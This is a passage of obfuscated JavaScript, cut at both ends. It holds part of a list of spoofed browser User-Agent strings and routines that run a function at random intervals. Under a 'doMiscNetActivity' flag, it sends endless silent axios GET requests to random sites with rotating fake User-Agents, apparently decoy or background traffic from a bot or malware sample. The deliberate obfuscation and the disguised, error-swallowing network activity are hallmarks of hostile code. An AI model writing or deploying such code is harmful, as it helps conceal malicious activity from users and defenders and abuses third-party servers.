      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x8 * -0x39c + 0x132 * -0x2 + -0x1a7c; k < -0x24d8 + -0x3ed + -0x35 * -0xc5; k++)
    setTimeout(f, (-0x60ba * 0x4 + -0x5490 + -0xc * -0x3ad2) * k * getRandomInt(0x17d6 + 0x2612 + 0x17 * -0x2b1, -0xb3 * 0x35 + 0x11 * 0x99 + -0x53 * -0x53));
  setInterval(() => {
    f();
    for (let l = 0x1f * 0x71 + -0x77 * -0x2e + -0x2311; l < -0x1ab2 + 0x1baa + -0xf4; l++)
      setTimeout(f, (-0x4d79 + 0x11901 + 0x2f * 0xa8) * l * getRandomInt(-0x1d90 + -0x268a + 0x441b, -0x2de * 0xc + -0xcf * 0x18 + 0x35d3));
  }, 0x5f2f81 + -0x4cb1d * -0x9 + 0x856e7 * -0xa);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x6d5 + 0x2ffb + -0xdce) * getRandomInt(0xb3 * -0xb + -0xe26 + 0x2bb * 0x8, 0x21c2 + 0x56 * 0x62 + -0x42a9));
}, -0x2375 + -0x1d46 + 0x411f);